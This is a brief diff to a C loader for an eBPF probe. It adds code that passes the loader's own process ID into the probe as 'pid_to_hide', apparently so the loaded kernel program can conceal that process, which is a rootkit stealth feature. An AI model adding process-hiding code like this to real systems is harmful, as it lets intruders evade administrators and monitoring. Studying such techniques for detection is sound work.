@@ -29,6 +29,7 @@
 #include <limits.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
 
 // clang-format off
@@ -118,6 +119,11 @@ void clisetup(int argc, char **argv) {
   }
 }
 
+static struct env {
+  int pid_to_hide;
+  int target_ppid;
+} env;
+
 // main
 //
 // The primary program entry point and argument handling
@@ -146,7 +152,19 @@ int main(int argc, char **argv) {
     return 1;
   }
   printf("  -> eBPF Probe loaded: %s\n", sfpath);
+
+
+  char pid[MAXPIDLEN];
+  env.pid_to_hide = getpid();
+  sprintf(pid, "%d", env.pid_to_hide);
+  strncpy(sfobj->rodata->pid_to_hide, pid, sizeof(sfobj->rodata->pid_to_hide));
+  sfobj->rodata->pid_to_hide_len = strlen(pid)+1;
+  sfobj->rodata->target_ppid = env.target_ppid;
+
+
+
   // TODO manage safe probe userspace
+
 
   // ===========================================================================
   // Boop probes
